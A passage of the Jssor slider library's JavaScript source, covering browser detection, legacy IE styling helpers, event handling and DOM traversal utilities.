    $IsVertical: function (direction) {
        return (direction & 0x000C) > 0;
    }
};

var $JssorKeyCode$ = {
    $BACKSPACE: 8,
    $COMMA: 188,
    $DELETE: 46,
    $DOWN: 40,
    $END: 35,
    $ENTER: 13,
    $ESCAPE: 27,
    $HOME: 36,
    $LEFT: 37,
    $NUMPAD_ADD: 107,
    $NUMPAD_DECIMAL: 110,
    $NUMPAD_DIVIDE: 111,
    $NUMPAD_ENTER: 108,
    $NUMPAD_MULTIPLY: 106,
    $NUMPAD_SUBTRACT: 109,
    $PAGE_DOWN: 34,
    $PAGE_UP: 33,
    $PERIOD: 190,
    $RIGHT: 39,
    $SPACE: 32,
    $TAB: 9,
    $UP: 38
};

var $JssorAlignment$ = {
    $TopLeft: 0x11,
    $TopCenter: 0x12,
    $TopRight: 0x14,
    $MiddleLeft: 0x21,
    $MiddleCenter: 0x22,
    $MiddleRight: 0x24,
    $BottomLeft: 0x41,
    $BottomCenter: 0x42,
    $BottomRight: 0x44,

    $IsTop: function (aligment) {
        return aligment & 0x10 > 0;
    },
    $IsMiddle: function (alignment) {
        return alignment & 0x20 > 0;
    },
    $IsBottom: function (alignment) {
        return alignment & 0x40 > 0;
    },
    $IsLeft: function (alignment) {
        return alignment & 0x01 > 0;
    },
    $IsCenter: function (alignment) {
        return alignment & 0x02 > 0;
    },
    $IsRight: function (alignment) {
        return alignment & 0x04 > 0;
    }
};

var $JssorMatrix$;

var $JssorAnimator$;

// $Jssor$ is a static class, so make it singleton instance
var $Jssor$ = window.$Jssor$ = new function () {
    // Fields
    var _This = this;

    var REGEX_WHITESPACE_GLOBAL = /\S+/g;

    var ROWSER_UNKNOWN = 0;
    var BROWSER_IE = 1;
    var BROWSER_FIREFOX = 2;
    var BROWSER_FIREFOX = 3;
    var BROWSER_CHROME = 4;
    var BROWSER_OPERA = 5;

    //var arrActiveX = ["Msxml2.XMLHTTP", "Msxml3.XMLHTTP", "Microsoft.XMLHTTP"];

    var browser = 0;
    var browserRuntimeVersion = 0;
    var browserEngineVersion = 0;
    var browserJavascriptVersion = 0;
    var webkitVersion = 0;

    var app = navigator.appName;
    var ver = navigator.appVersion;
    var ua = navigator.userAgent;

    var _DocElmt = document.documentElement;
    var _TransformProperty;

    function DetectBrowser() {
        if (!browser) {
            if (app == "Microsoft Internet Explorer" &&
                !!window.attachEvent && !!window.ActiveXObject) {

                var ieOffset = ua.indexOf("MSIE");
                browser = BROWSER_IE;
                browserEngineVersion = ParseFloat(ua.substring(ieOffset + 5, ua.indexOf(";", ieOffset)));

                //check IE javascript version
                /*@cc_on
                browserJavascriptVersion = @_jscript_version;
                @*/

                // update: for intranet sites and compat view list sites, IE sends
                // an IE7 User-Agent to the server to be interoperable, and even if
                // the page requests a later IE version, IE will still report the
                // IE7 UA to JS. we should be robust to self
                //var docMode = document.documentMode;
                //if (typeof docMode !== "undefined") {
                //    browserRuntimeVersion = docMode;
                //}

                browserRuntimeVersion = document.documentMode || browserEngineVersion;

            }
            else if (app == "Netscape" && !!window.addEventListener) {

                var ffOffset = ua.indexOf("Firefox");
                var saOffset = ua.indexOf("Safari");
                var chOffset = ua.indexOf("Chrome");
                var webkitOffset = ua.indexOf("AppleWebKit");

                if (ffOffset >= 0) {
                    browser = BROWSER_FIREFOX;
                    browserRuntimeVersion = ParseFloat(ua.substring(ffOffset + 8));
                }
                else if (saOffset >= 0) {
                    var slash = ua.substring(0, saOffset).lastIndexOf("/");
                    browser = (chOffset >= 0) ? BROWSER_CHROME : BROWSER_FIREFOX;
                    browserRuntimeVersion = ParseFloat(ua.substring(slash + 1, saOffset));
                }

                if (webkitOffset >= 0)
                    webkitVersion = ParseFloat(ua.substring(webkitOffset + 12));
            }
            else {
                var match = /(opera)(?:.*version|)[ \/]([\w.]+)/i.exec(ua);
                if (match) {
                    browser = BROWSER_OPERA;
                    browserRuntimeVersion = ParseFloat(match[2]);
                }
            }
        }
    }

    function IsBrowserIE() {
        DetectBrowser();
        return browser == BROWSER_IE;
    }

    function IsBrowserIeQuirks() {
        return IsBrowserIE() && (browserRuntimeVersion < 6 || document.compatMode == "BackCompat");   //Composite to "CSS1Compat"
    }

    function IsBrowserFireFox() {
        DetectBrowser();
        return browser == BROWSER_FIREFOX;
    }

    function IsBrowserSafari() {
        DetectBrowser();
        return browser == BROWSER_FIREFOX;
    }

    function IsBrowserChrome() {
        DetectBrowser();
        return browser == BROWSER_CHROME;
    }

    function IsBrowserOpera() {
        DetectBrowser();
        return browser == BROWSER_OPERA;
    }

    function IsBrowserBadTransform() {
        return IsBrowserSafari() && (webkitVersion > 534) && (webkitVersion < 535);
    }

    function IsBrowserIe9Earlier() {
        return IsBrowserIE() && browserRuntimeVersion < 9; 
    }

    function GetTransformProperty(elmt) {

        if (!_TransformProperty) {
            // Note that in some versions of IE9 it is critical that
            // msTransform appear in this list before MozTransform

            each(['transform', 'WebkitTransform', 'msTransform', 'MozTransform', 'OTransform'], function (property) {
                if (elmt.style[property] != undefined) {
                    _TransformProperty = property;
                    return true;
                }
            });

            _TransformProperty = _TransformProperty || "transform";
        }

        return _TransformProperty;
    }

    // Helpers
    function getOffsetParent(elmt, isFixed) {
        // IE and Opera "fixed" position elements don't have offset parents.
        // regardless, if it's fixed, its offset parent is the body.
        if (isFixed && elmt != document.body) {
            return document.body;
        } else {
            return elmt.offsetParent;
        }
    }

    function toString(obj) {
        return Object.prototype.toString.call(obj);
    }

    // [[Class]] -> type pairs
    var class2type;

    function each(object, callback) {
        if (toString(object) == "[object Array]") {
            for (var i = 0; i < object.length; i++) {
                if (callback(object[i], i, object)) {
                    return true;
                }
            }
        }
        else {
            for (var name in object) {
                if (callback(object[name], name, object)) {
                    return true;
                }
            }
        }
    }

    function GetClass2Type() {
        if (!class2type) {
            class2type = {};
            each(["Boolean", "Number", "String", "Function", "Array", "Date", "RegExp", "Object"], function (name) {
                class2type["[object " + name + "]"] = name.toLowerCase();
            });
        }

        return class2type;
    }

    function type(obj) {
        return obj == null ? String(obj) : GetClass2Type()[toString(obj)] || "object";
    }

    function isPlainObject(obj) {
        // Must be an Object.
        // Because of IE, we also have to check the presence of the constructor property.
        // Make sure that DOM nodes and window objects don't pass through, as well
        if (!obj || type(obj) !== "object" || obj.nodeType || _This.$IsWindow(obj)) {
            return false;
        }

        var hasOwn = Object.prototype.hasOwnProperty;

        try {
            // Not own constructor property must be Object
            if (obj.constructor &&
				!hasOwn.call(obj, "constructor") &&
				!hasOwn.call(obj.constructor.prototype, "isPrototypeOf")) {
                return false;
            }
        } catch (e) {
            // IE8,9 Will throw exceptions on certain host objects #9897
            return false;
        }

        // Own properties are enumerated firstly, so to speed up,
        // if last one is own, then all properties are own.

        var key;
        for (key in obj) { }

        return key === undefined || hasOwn.call(obj, key);
    }

    function Point(x, y) {
        return { x: x, y: y };
    }

    function Delay(code, delay) {
        setTimeout(code, delay || 0);
    }

    function RemoveByReg(str, reg) {
        var m = reg.exec(str);

        if (m) {
            var header = str.substr(0, m.index);
            var tailer = str.substr(m.lastIndex + 1, str.length - (m.lastIndex + 1));
            str = header + tailer;
        }

        return str;
    }

    function BuildNewCss(oldCss, removeRegs, replaceValue) {
        var css = (!oldCss || oldCss == "inherit") ? "" : oldCss;

        each(removeRegs, function (removeReg) {
            var m = removeReg.exec(css);

            if (m) {
                var header = css.substr(0, m.index);
                var tailer = css.substr(m.lastIndex + 1, css.length - (m.lastIndex + 1));
                css = header + tailer;
            }
        });

        css = replaceValue + (css.indexOf(" ") != 0 ? " " : "") + css;

        return css;
    }

    function SetStyleFilterIE(elmt, value) {
        if (browserRuntimeVersion < 9) {
            elmt.style.filter = value;
        }
    }

    function SetStyleMatrixIE(elmt, matrix, offset) {
        //matrix is not for ie9+ running in ie8- mode
        if (browserJavascriptVersion < 9) {
            var oldFilterValue = elmt.style.filter;
            var matrixReg = new RegExp(/[\s]*progid:DXImageTransform\.Microsoft\.Matrix\([^\)]*\)/g);
            var matrixValue = matrix ? "progid:DXImageTransform.Microsoft.Matrix(" + "M11=" + matrix[0][0] + ", M12=" + matrix[0][1] + ", M21=" + matrix[1][0] + ", M22=" + matrix[1][1] + ", SizingMethod='auto expand')" : "";

            var newFilterValue = BuildNewCss(oldFilterValue, [matrixReg], matrixValue);

            SetStyleFilterIE(elmt, newFilterValue);

            _This.$CssMarginTop(elmt, offset.y);
            _This.$CssMarginLeft(elmt, offset.x);
        }
    }

    // Methods

    _This.$IsBrowserIE = IsBrowserIE;

    _This.$IsBrowserIeQuirks = IsBrowserIeQuirks;

    _This.$IsBrowserFireFox = IsBrowserFireFox;

    _This.$IsBrowserSafari = IsBrowserSafari;

    _This.$IsBrowserChrome = IsBrowserChrome;

    _This.$IsBrowserOpera = IsBrowserOpera;

    _This.$IsBrowserBadTransform = IsBrowserBadTransform;

    _This.$IsBrowserIe9Earlier = IsBrowserIe9Earlier;

    _This.$BrowserVersion = function () {
        return browserRuntimeVersion;
    };

    _This.$BrowserEngineVersion = function () {
        return browserEngineVersion || browserRuntimeVersion;
    };

    _This.$WebKitVersion = function () {
        DetectBrowser();

        return webkitVersion;
    };

    _This.$Delay = Delay;

    _This.$Inherit = function (instance, baseClass) {
        baseClass.apply(instance, [].slice.call(arguments, 2));
        return Extend({}, instance);
    };

    function Construct(instance, constructor) {
        instance.constructor === Construct.caller && instance.$Construct && instance.$Construct();
    }

    _This.$Construct = Construct;

    _This.$GetElement = function (elmt) {
        if (_This.$IsString(elmt)) {
            elmt = document.getElementById(elmt);
        }

        return elmt;
    };

    function GetEvent(event) {
        return event || window.event;
    }

    _This.$GetEvent = GetEvent;

    _This.$EventSrc = function (event) {
        event = GetEvent(event);
        return event.target || event.srcElement || document;
    };

    _This.$EventDst = function (event) {
        event = GetEvent(event);
        return event.relatedTarget || event.toElement;
    };

    _This.$MousePosition = function (event) {
        event = GetEvent(event);
        var body = document.body;

        return {
            x: event.pageX || event.clientX + (_DocElmt.scrollLeft || body.scrollLeft || 0) - (_DocElmt.clientLeft || body.clientLeft || 0) || 0,
            y: event.pageY || event.clientY + (_DocElmt.scrollTop || body.scrollTop || 0) - (_DocElmt.clientTop || body.clientTop || 0) || 0
        };
    };

    _This.$PageScroll = function () {
        var body = document.body;

        return {
            x: (window.pageXOffset || _DocElmt.scrollLeft || body.scrollLeft || 0) - (_DocElmt.clientLeft || body.clientLeft || 0),
            y: (window.pageYOffset || _DocElmt.scrollTop || body.scrollTop || 0) - (_DocElmt.clientTop || body.clientTop || 0)
        };
    };

    _This.$WindowSize = function () {
        var body = document.body;

        return {
            x: body.clientWidth || _DocElmt.clientWidth,
            y: body.clientHeight || _DocElmt.clientHeight
        };
    };

    //_This.$GetElementPosition = function (elmt) {
    //    elmt = _This.$GetElement(elmt);
    //    var result = Point();

    //    // technique from:
    //    // http://www.quirksmode.org/js/findpos.html
    //    // with special check for "fixed" elements.

    //    while (elmt) {
    //        result.x += elmt.offsetLeft;
    //        result.y += elmt.offsetTop;

    //        var isFixed = _This.$GetElementStyle(elmt).position == "fixed";

    //        if (isFixed) {
    //            result = result.$Plus(_This.$PageScroll(window));
    //        }

    //        elmt = getOffsetParent(elmt, isFixed);
    //    }

    //    return result;
    //};

    //_This.$GetMouseScroll = function (event) {
    //    event = GetEvent(event);
    //    var delta = 0; // default value

    //    // technique from:
    //    // http://blog.paranoidferret.com/index.php/2007/10/31/javascript-tutorial-the-scroll-wheel/

    //    if (typeof (event.wheelDelta) == "number") {
    //        delta = event.wheelDelta;
    //    } else if (typeof (event.detail) == "number") {
    //        delta = event.detail * -1;
    //    } else {
    //        $JssorDebug$.$Fail("Unknown event mouse scroll, no known technique.");
    //    }

    //    // normalize value to [-1, 1]
    //    return delta ? delta / Math.abs(delta) : 0;
    //};

    //_This.$MakeAjaxRequest = function (url, callback) {
    //    var async = typeof (callback) == "function";
    //    var req = null;

    //    if (async) {
    //        var actual = callback;
    //        var callback = function () {
    //            Delay($Jssor$.$CreateCallback(null, actual, req), 1);
    //        };
    //    }

    //    if (window.ActiveXObject) {
    //        for (var i = 0; i < arrActiveX.length; i++) {
    //            try {
    //                req = new ActiveXObject(arrActiveX[i]);
    //                break;
    //            } catch (e) {
    //                continue;
    //            }
    //        }
    //    } else if (window.XMLHttpRequest) {
    //        req = new XMLHttpRequest();
    //    }

    //    if (!req) {
    //        $JssorDebug$.$Fail("Browser doesn't support XMLHttpRequest.");
    //    }

    //    if (async) {
    //        req.onreadystatechange = function () {
    //            if (req.readyState == 4) {
    //                // prevent memory leaks by breaking circular reference now
    //                req.onreadystatechange = new Function();
    //                callback();
    //            }
    //        };
    //    }

    //    try {
    //        req.open("GET", url, async);
    //        req.send(null);
    //    } catch (e) {
    //        $JssorDebug$.$Log(e.name + " while making AJAX request: " + e.message);

    //        req.onreadystatechange = null;
    //        req = null;

    //        if (async) {
    //            callback();
    //        }
    //    }

    //    return async ? null : req;
    //};

    //_This.$ParseXml = function (string) {
    //    var xmlDoc = null;

    //    if (window.ActiveXObject) {
    //        try {
    //            xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    //            xmlDoc.async = false;
    //            xmlDoc.loadXML(string);
    //        } catch (e) {
    //            $JssorDebug$.$Log(e.name + " while parsing XML (ActiveX): " + e.message);
    //        }
    //    } else if (window.DOMParser) {
    //        try {
    //            var parser = new DOMParser();
    //            xmlDoc = parser.parseFromString(string, "text/xml");
    //        } catch (e) {
    //            $JssorDebug$.$Log(e.name + " while parsing XML (DOMParser): " + e.message);
    //        }
    //    } else {
    //        $JssorDebug$.$Fail("Browser doesn't support XML DOM.");
    //    }

    //    return xmlDoc;
    //};

    function Css(elmt, name, value) {
        ///	<summary>
        ///		access css
        ///     $Jssor$.$Css(elmt, name);         //get css value
        ///     $Jssor$.$Css(elmt, name, value);  //set css value
        ///	</summary>
        ///	<param name="elmt" type="HTMLElement">
        ///		the element to access css
        ///	</param>
        ///	<param name="name" type="String">
        ///		the name of css property
        ///	</param>
        ///	<param name="value" optional="true">
        ///		the value to set
        ///	</param>
        if (value != undefined) {
            elmt.style[name] = value;
        }
        else {
            var style = elmt.currentStyle || elmt.style;
            value = style[name];

            if (value == "" && window.getComputedStyle) {
                style = elmt.ownerDocument.defaultView.getComputedStyle(elmt, null);

                style && (value = style.getPropertyValue(name) || style[name]);
            }

            return value;
        }
    }

    function CssN(elmt, name, value, isDimensional) {
        ///	<summary>
        ///		access css as numeric
        ///     $Jssor$.$CssN(elmt, name);         //get css value
        ///     $Jssor$.$CssN(elmt, name, value);  //set css value
        ///	</summary>
        ///	<param name="elmt" type="HTMLElement">
        ///		the element to access css
        ///	</param>
        ///	<param name="name" type="String">
        ///		the name of css property
        ///	</param>
        ///	<param name="value" type="Number" optional="true">
        ///		the value to set
        ///	</param>
        if (value != undefined) {
            isDimensional && (value += "px");
            Css(elmt, name, value);
        }
        else {
            return ParseFloat(Css(elmt, name));
        }
    }

    function CssP(elmt, name, value) {
        ///	<summary>
        ///		access css in pixel as numeric, like 'top', 'left', 'width', 'height'
        ///     $Jssor$.$CssP(elmt, name);         //get css value
        ///     $Jssor$.$CssP(elmt, name, value);  //set css value
        ///	</summary>
        ///	<param name="elmt" type="HTMLElement">
        ///		the element to access css
        ///	</param>
        ///	<param name="name" type="String">
        ///		the name of css property
        ///	</param>
        ///	<param name="value" type="Number" optional="true">
        ///		the value to set
        ///	</param>
        return CssN(elmt, name, value, true);
    }

    function CssProxy(name, numericOrDimension) {
        ///	<summary>
        ///		create proxy to access css, CssProxy(name[, numericOrDimension]);
        ///	</summary>
        ///	<param name="elmt" type="HTMLElement">
        ///		the element to access css
        ///	</param>
        ///	<param name="numericOrDimension" type="Number" optional="true">
        ///		not set: access original css, 1: access css as numeric, 2: access css in pixel as numeric
        ///	</param>
        var isDimensional = numericOrDimension & 2;
        var cssAccessor = numericOrDimension ? CssN : Css;
        return function (elmt, value) {
            return cssAccessor(elmt, name, value, isDimensional);
        };
    }

    function GetStyleOpacity(elmt) {
        if (IsBrowserIE() && browserEngineVersion < 9) {
            var match = /opacity=([^)]*)/.exec(elmt.style.filter || "");
            return match ? (ParseFloat(match[1]) / 100) : 1;
        }
        else
            return ParseFloat(elmt.style.opacity || "1");
    }

    function SetStyleOpacity(elmt, opacity, ie9EarlierForce) {

        if (IsBrowserIE() && browserEngineVersion < 9) {
            //var filterName = "filter"; // browserEngineVersion < 8 ? "filter" : "-ms-filter";
            var finalFilter = elmt.style.filter || "";

            // for CSS filter browsers (IE), remove alpha filter if it's unnecessary.
            // update: doing _This always since IE9 beta seems to have broken the
            // behavior if we rely on the programmatic filters collection.
            var alphaReg = new RegExp(/[\s]*alpha\([^\)]*\)/g);

            // important: note the lazy star! _This protects against
            // multiple filters; we don't want to delete the other ones.
            // update: also trimming extra whitespace around filter.

            var ieOpacity = Math.round(100 * opacity);
            var alphaFilter = "";
            if (ieOpacity < 100 || ie9EarlierForce) {
                alphaFilter = "alpha(opacity=" + ieOpacity + ") ";
                //elmt.style["-ms-filter"] = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + ieOpacity + ") ";
            }

            var newFilterValue = BuildNewCss(finalFilter, [alphaReg], alphaFilter);

            SetStyleFilterIE(elmt, newFilterValue);
        }

            //if (!IsBrowserIE() || browserEngineVersion >= 9) 
        else {
            elmt.style.opacity = opacity == 1 ? "" : Math.round(opacity * 100) / 100;
        }
    }

    function SetStyleTransformInternal(elmt, transform) {
        var rotate = transform.$Rotate || 0;
        var scale = transform.$Scale == undefined ? 1 : transform.$Scale;

        if (IsBrowserIe9Earlier()) {
            var matrix = _This.$CreateMatrix(rotate / 180 * Math.PI, scale, scale);
            SetStyleMatrixIE(elmt, (!rotate && scale == 1) ? null : matrix, _This.$GetMatrixOffset(matrix, transform.$OriginalWidth, transform.$OriginalHeight));
        }
        else {
            //rotate(15deg) scale(.5) translateZ(0)
            var transformProperty = GetTransformProperty(elmt);
            if (transformProperty) {
                var transformValue = "rotate(" + rotate % 360 + "deg) scale(" + scale + ")";

                //needed for touch device, no need for desktop device
                if (IsBrowserChrome() && webkitVersion > 535 && "ontouchstart" in window)
                    transformValue += " perspective(2000px)";

                elmt.style[transformProperty] = transformValue;
            }
        }
    }

    _This.$SetStyleTransform = function (elmt, transform) {
        if (IsBrowserBadTransform()) {
            Delay(_This.$CreateCallback(null, SetStyleTransformInternal, elmt, transform));
        }
        else {
            SetStyleTransformInternal(elmt, transform);
        }
    };

    _This.$SetStyleTransformOrigin = function (elmt, transformOrigin) {
        var transformProperty = GetTransformProperty(elmt);

        if (transformProperty)
            elmt.style[transformProperty + "Origin"] = transformOrigin;
    };

    _This.$CssScale = function (elmt, scale) {

        if (IsBrowserIE() && browserEngineVersion < 9 || (browserEngineVersion < 10 && IsBrowserIeQuirks())) {
            elmt.style.zoom = (scale == 1) ? "" : scale;
        }
        else {
            var transformProperty = GetTransformProperty(elmt);

            if (transformProperty) {
                //rotate(15deg) scale(.5)
                var transformValue = "scale(" + scale + ")";

                var oldTransformValue = elmt.style[transformProperty];
                var scaleReg = new RegExp(/[\s]*scale\(.*?\)/g);

                var newTransformValue = BuildNewCss(oldTransformValue, [scaleReg], transformValue);

                elmt.style[transformProperty] = newTransformValue;
            }
        }
    };

    _This.$EnableHWA = function (elmt) {
        if (!elmt.style[GetTransformProperty(elmt)] || elmt.style[GetTransformProperty(elmt)] == "none")
            elmt.style[GetTransformProperty(elmt)] = "perspective(2000px)";
    };

    _This.$DisableHWA = function (elmt) {
        //if (force || elmt.style[GetTransformProperty(elmt)] == "perspective(2000px)")
        elmt.style[GetTransformProperty(elmt)] = "none";
    };

    var ie8OffsetWidth = 0;
    var ie8OffsetHeight = 0;
    //var ie8WindowResizeCallbackHandlers;
    //var ie8LastVerticalScrollbar;
    //var toggleInfo = "";

    //function Ie8WindowResizeFilter(window, handler) {

    //    var trigger = true;

    //    var checkElement = (IsBrowserIeQuirks() ? window.document.body : window.document.documentElement);
    //    if (checkElement) {
    //        //check vertical bar
    //        //var hasVerticalBar = checkElement.scrollHeight > checkElement.clientHeight;
    //        //var verticalBarToggle = hasVerticalBar != ie8LastVerticalScrollbar;
    //        //ie8LastVerticalScrollbar = hasVerticalBar;

    //        var widthChange = checkElement.offsetWidth - ie8OffsetWidth;
    //        var heightChange = checkElement.offsetHeight - ie8OffsetHeight;
    //        if (widthChange || heightChange) {

    //            ie8OffsetWidth += widthChange;
    //            ie8OffsetHeight += heightChange;
    //        }
    //        else
    //            trigger = false;
    //    }

    //    trigger && handler();
    //}

    //_This.$OnWindowResize = function (window, handler) {

    //    if (IsBrowserIE() && browserEngineVersion < 9) {
    //        if (!ie8WindowResizeCallbackHandlers) {
    //            ie8WindowResizeCallbackHandlers = [handler];
    //            handler = _This.$CreateCallback(null, Ie8WindowResizeFilter, window);
    //        }
    //        else {
    //            ie8WindowResizeCallbackHandlers.push(handler);
    //            return;
    //        }
    //    }

    //    _This.$AddEvent(window, "resize", handler);
    //};

    _This.$WindowResizeFilter = function (window, handler) {
        return IsBrowserIe9Earlier() ? function () {

            var trigger = true;

            var checkElement = (IsBrowserIeQuirks() ? window.document.body : window.document.documentElement);
            if (checkElement) {
                //check vertical bar
                //var hasVerticalBar = checkElement.scrollHeight > checkElement.clientHeight;
                //var verticalBarToggle = hasVerticalBar != ie8LastVerticalScrollbar;
                //ie8LastVerticalScrollbar = hasVerticalBar;

                var widthChange = checkElement.offsetWidth - ie8OffsetWidth;
                var heightChange = checkElement.offsetHeight - ie8OffsetHeight;
                if (widthChange || heightChange) {
                    ie8OffsetWidth += widthChange;
                    ie8OffsetHeight += heightChange;
                }
                else
                    trigger = false;
            }

            trigger && handler();

        } : handler;
    };

    _This.$MouseOverOutFilter = function (handler, target) {
        ///	<param name="target" type="HTMLDomElement">
        ///		The target element to detect mouse over/out events. (for ie < 9 compatibility)
        ///	</param>

        $JssorDebug$.$Execute(function () {
            if (!target) {
                throw new Error("Null reference, parameter \"target\".");
            }
        });

        return function (event) {
            event = GetEvent(event);

            var eventName = event.type;
            var related = event.relatedTarget || (eventName == "mouseout" ? event.toElement : event.fromElement);

            if (!related || (related !== target && !_This.$IsChild(target, related))) {
                handler(event);
            }
        };
    };

    _This.$AddEvent = function (elmt, eventName, handler, useCapture) {
        elmt = _This.$GetElement(elmt);

        // technique from:
        // http://blog.paranoidferret.com/index.php/2007/08/10/javascript-working-with-events/

        if (elmt.addEventListener) {
            if (eventName == "mousewheel") {
                elmt.addEventListener("DOMMouseScroll", handler, useCapture);
            }
            // we are still going to add the mousewheel -- not a mistake!
            // _This is for opera, since it uses onmousewheel but needs addEventListener.
            elmt.addEventListener(eventName, handler, useCapture);
        }
        else if (elmt.attachEvent) {
            elmt.attachEvent("on" + eventName, handler);
            if (useCapture && elmt.setCapture) {
                elmt.setCapture();
            }
        }

        $JssorDebug$.$Execute(function () {
            if (!elmt.addEventListener && !elmt.attachEvent) {
                $JssorDebug$.$Fail("Unable to attach event handler, no known technique.");
            }
        });

    };

    _This.$RemoveEvent = function (elmt, eventName, handler, useCapture) {
        elmt = _This.$GetElement(elmt);

        // technique from:
        // http://blog.paranoidferret.com/index.php/2007/08/10/javascript-working-with-events/

        if (elmt.removeEventListener) {
            if (eventName == "mousewheel") {
                elmt.removeEventListener("DOMMouseScroll", handler, useCapture);
            }
            // we are still going to remove the mousewheel -- not a mistake!
            // _This is for opera, since it uses onmousewheel but needs removeEventListener.
            elmt.removeEventListener(eventName, handler, useCapture);
        }
        else if (elmt.detachEvent) {
            elmt.detachEvent("on" + eventName, handler);
            if (useCapture && elmt.releaseCapture) {
                elmt.releaseCapture();
            }
        }
    };

    _This.$FireEvent = function (elmt, eventName) {
        //var document = elmt.document;

        $JssorDebug$.$Execute(function () {
            if (!document.createEvent && !document.createEventObject) {
                $JssorDebug$.$Fail("Unable to fire event, no known technique.");
            }

            if (!elmt.dispatchEvent && !elmt.fireEvent) {
                $JssorDebug$.$Fail("Unable to fire event, no known technique.");
            }
        });

        var evento;

        if (document.createEvent) {
            evento = document.createEvent("HTMLEvents");
            evento.initEvent(eventName, false, false);
            elmt.dispatchEvent(evento);
        }
        else {
            var ieEventName = "on" + eventName;
            evento = document.createEventObject();
            //event.eventType = ieEventName;
            //event.eventName = ieEventName;

            elmt.fireEvent(ieEventName, evento);
        }
    };

    _This.$AddEventBrowserMouseUp = function (handler, userCapture) {
        _This.$AddEvent((IsBrowserIe9Earlier()) ? document : window, "mouseup", handler, userCapture);
    };

    _This.$RemoveEventBrowserMouseUp = function (handler, userCapture) {
        _This.$RemoveEvent((IsBrowserIe9Earlier()) ? document : window, "mouseup", handler, userCapture);
    };

    //_This.$AddEventBrowserMouseDown = function (handler, userCapture) {
    //    _This.$AddEvent((IsBrowserIe9Earlier()) ? document : window, "mousedown", handler, userCapture);
    //};

    //_This.$RemoveEventBrowserMouseDown = function (handler, userCapture) {
    //    _This.$RemoveEvent((IsBrowserIe9Earlier()) ? document : window, "mousedown", handler, userCapture);
    //};

    _This.$CancelEvent = function (event) {
        event = GetEvent(event);

        // technique from:
        // http://blog.paranoidferret.com/index.php/2007/08/10/javascript-working-with-events/

        if (event.preventDefault) {
            event.preventDefault();     // W3C for preventing default
        }

        event.cancel = true;            // legacy for preventing default
        event.returnValue = false;      // IE for preventing default
    };

    _This.$StopEvent = function (event) {
        event = GetEvent(event);

        // technique from:
        // http://blog.paranoidferret.com/index.php/2007/08/10/javascript-working-with-events/

        if (event.stopPropagation) {
            event.stopPropagation();    // W3C for stopping propagation
        }

        event.cancelBubble = true;      // IE for stopping propagation
    };

    _This.$CreateCallback = function (object, method) {
        // create callback args
        var initialArgs = [].slice.call(arguments, 2);

        // create closure to apply method
        var callback = function () {
            // concatenate new args, but make a copy of initialArgs first
            var args = initialArgs.concat([].slice.call(arguments, 0));

            return method.apply(object, args);
        };

        //$JssorDebug$.$LiveStamp(callback, "callback_" + ($Jssor$.$GetNow() & 0xFFFFFF));

        return callback;
    };

    var _Freeer;
    _This.$FreeElement = function (elmt) {
        if (!_Freeer)
            _Freeer = _This.$CreateDiv();

        if (elmt) {
            $Jssor$.$AppendChild(_Freeer, elmt);
            $Jssor$.$ClearInnerHtml(_Freeer);
        }
    };

    _This.$InnerText = function (elmt, text) {
        if (text == undefined)
            return elmt.textContent || elmt.innerText;

        var textNode = document.createTextNode(text);
        _This.$ClearInnerHtml(elmt);
        elmt.appendChild(textNode);
    };
    
    _This.$InnerHtml = function (elmt, html) {
        if (html == undefined)
            return elmt.innerHTML;

        elmt.innerHTML = html;
    };

    _This.$GetClientRect = function (elmt) {
        var rect = elmt.getBoundingClientRect();

        return { x: rect.left, y: rect.top, w: rect.right - rect.left, h: rect.bottom - rect.top };
    };

    _This.$ClearInnerHtml = function (elmt) {
        elmt.innerHTML = "";
    };

    _This.$EncodeHtml = function (text) {
        var div = _This.$CreateDiv();
        _This.$InnerText(div, text);
        return _This.$InnerHtml(div);
    };

    _This.$DecodeHtml = function (html) {
        var div = _This.$CreateDiv();
        _This.$InnerHtml(div, html);
        return _This.$InnerText(div);
    };

    _This.$SelectElement = function (elmt) {
        var userSelection;
        if (window.getSelection) {
            //W3C default
            userSelection = window.getSelection();
        }
        var theRange = null;
        if (document.createRange) {
            theRange = document.createRange();
            theRange.selectNode(elmt);
        }
        else {
            theRange = document.body.createTextRange();
            theRange.moveToElementText(elmt);
            theRange.select();
        }
        //set user selection
        if (userSelection)
            userSelection.addRange(theRange);
    };

    _This.$DeselectElements = function () {
        if (document.selection) {
            document.selection.empty();
        } else if (window.getSelection) {
            window.getSelection().removeAllRanges();
        }
    };

    _This.$Children = function (elmt) {
        var children = [];

        for (var tmpEl = elmt.firstChild; tmpEl; tmpEl = tmpEl.nextSibling) {
            if (tmpEl.nodeType == 1) {
                children.push(tmpEl);
            }
        }

        return children;
    };

    function FindChild(elmt, attrValue, noDeep, attrName) {
        attrName = attrName || "u";

        for (elmt = elmt ? elmt.firstChild : null; elmt; elmt = elmt.nextSibling) {
            if (elmt.nodeType == 1) {
                if (AttributeEx(elmt, attrName) == attrValue)
                    return elmt;

                if (!noDeep) {
                    var childRet = FindChild(elmt, attrValue, noDeep, attrName);
                    if (childRet)
                        return childRet;
                }
            }
        }
    }

    _This.$FindChild = FindChild;

    function FindChildren(elmt, attrValue, noDeep, attrName) {
        attrName = attrName || "u";

        var ret = [];

        for (elmt = elmt ? elmt.firstChild : null; elmt; elmt = elmt.nextSibling) {
            if (elmt.nodeType == 1) {
                if (AttributeEx(elmt, attrName) == attrValue)
                    ret.push(elmt);

                if (!noDeep) {
                    var childRet = FindChildren(elmt, attrValue, noDeep, attrName);
                    if (childRet.length)
                        ret = ret.concat(childRet);
                }
            }
        }

        return ret;
    }

    _This.$FindChildren = FindChildren;

    function FindChildByTag(elmt, tagName, noDeep) {

        for (elmt = elmt ? elmt.firstChild : null; elmt; elmt = elmt.nextSibling) {
            if (elmt.nodeType == 1) {
                if (elmt.tagName == tagName)
                    return elmt;

                if (!noDeep) {
                    var childRet = FindChildByTag(elmt, tagName, noDeep);
                    if (childRet)
                        return childRet;
                }
            }
        }
    }

    _This.$FindChildByTag = FindChildByTag;

    function FindChildrenByTag(elmt, tagName, noDeep) {
        var ret = [];

        for (elmt = elmt ? elmt.firstChild : null; elmt; elmt = elmt.nextSibling) {
            if (elmt.nodeType == 1) {
                if (!tagName || elmt.tagName == tagName)
                    ret.push(elmt);

                if (!noDeep) {
                    var childRet = FindChildrenByTag(elmt, tagName, noDeep);
                    if (childRet.length)
                        ret = ret.concat(childRet);
                }
            }
        }

        return ret;
    }

    _This.$FindChildrenByTag = FindChildrenByTag;

    _This.$GetElementsByTag = function (elmt, tagName) {
        return elmt.getElementsByTagName(tagName);
    };

    function Extend(target) {
